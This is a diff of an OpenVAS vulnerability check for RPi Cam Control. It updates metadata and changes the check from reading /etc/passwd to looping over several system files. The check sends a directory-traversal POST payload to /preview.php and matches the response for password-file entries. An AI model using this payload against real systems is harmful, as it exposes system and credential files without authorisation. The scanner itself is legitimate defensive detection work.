@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_rpi_cam_control_multiple_vuln.nasl 9782 2018-05-09 13:46:05Z cfischer $
+# $Id: gb_rpi_cam_control_multiple_vuln.nasl 11759 2018-10-05 09:53:49Z ckuersteiner $
 #
 # RPi Cam Control Multiple Vulnerabilities
 #
@@ -29,10 +29,10 @@ CPE = "cpe:/a:rpi:cam_control";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.812362");
-  script_version("$Revision: 9782 $");
+  script_version("$Revision: 11759 $");
   script_tag(name:"cvss_base", value:"10.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2018-05-09 15:46:05 +0200 (Wed, 09 May 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-05 11:53:49 +0200 (Fri, 05 Oct 2018) $");
   script_tag(name:"creation_date", value:"2017-12-26 14:19:48 +0530 (Tue, 26 Dec 2017)");
   script_name("RPi Cam Control Multiple Vulnerabilities");
 
@@ -48,47 +48,54 @@ if(description)
 
   script_tag(name:"impact", value:"Successful exploitation will allow a remote
   attacker to read arbitrary files and also execute arbitrary commands on the
-  affected system.
-
-  Impact Level: System/Application");
+  affected system.");
 
   script_tag(name:"affected", value:"RPi Cam Control versions through 6.4.14");
 
-  script_tag(name:"solution", value:"No solution or patch is available as of 07th May, 2018. Information
-regarding this issue will be updated once solution details are available.");
+  script_tag(name:"solution", value:"No known solution is available as of 05th October, 2018. Information
+  regarding this issue will be updated once solution details are available.");
 
   script_tag(name:"solution_type", value:"NoneAvailable");
 
   script_tag(name:"qod_type", value:"remote_vul");
 
-  script_xref(name : "URL" , value : "https://www.exploit-db.com/exploits/42638");
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/42638");
 
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2017 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_rpi_cam_control_detect.nasl");
+  script_dependencies("gb_rpi_cam_control_detect.nasl", "os_detection.nasl");
   script_mandatory_keys("RPi/Cam/Control/Installed");
   script_require_ports("Services/www", 80);
+
   exit(0);
 }
 
 include("http_func.inc");
 include("http_keepalive.inc");
 include("host_details.inc");
+include("misc_func.inc");
 
 if (!ripPort = get_app_port(cpe:CPE))
   exit(0);
 
-postData = "download1=../../../../../../../../../../../../../../../../etc/passwd.v0000.t";
-req = http_post_req(port:ripPort, url:"/preview.php", data:postData,
-      add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
-res = http_keepalive_send_recv(port:ripPort, data: req);
+files = traversal_files("linux");
 
-if(res =~ "HTTP/1.. 200 OK" && res =~ "root:.*:0:[01]:")
-{
-  report = report_vuln_url(port:ripPort, url:"/preview.php");
-  security_message(port:ripPort, data:report);
-  exit(0);
+foreach pattern(keys(files)) {
+
+  file = files[pattern];
+
+  postData = "download1=../../../../../../../../../../../../../../../../" + file + ".v0000.t";
+  req = http_post_req(port:ripPort, url:"/preview.php", data:postData,
+        add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"));
+  res = http_keepalive_send_recv(port:ripPort, data: req);
+
+  if(res =~ "HTTP/1.. 200 OK" && egrep(string:res, pattern:pattern))
+  {
+    report = report_vuln_url(port:ripPort, url:"/preview.php");
+    security_message(port:ripPort, data:report);
+    exit(0);
+  }
 }
 
 exit(99);
